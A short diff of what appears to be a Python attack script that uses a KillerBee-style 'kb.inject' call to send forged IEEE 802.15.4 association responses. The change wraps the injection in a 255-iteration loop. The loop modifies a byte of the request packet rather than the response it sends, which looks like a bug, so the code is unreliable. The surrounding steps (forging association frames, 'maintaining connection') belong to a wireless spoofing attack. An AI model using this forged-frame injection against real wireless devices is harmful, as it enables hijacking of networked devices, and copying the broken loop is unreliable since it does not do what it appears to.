@@ -154,7 +154,9 @@ if __name__ == '__main__':
 
         # Send forged association response
         print('9. Sending association response.')
-        kb.inject(assoc_response_pkt_bytes)
+        for i in range(0,255):
+            assoc_request_pkt_bytes[2] = i
+            kb.inject(assoc_response_pkt_bytes)
 
         # ACK data requests and note when data was received
         print('10. Maintaining connection...')
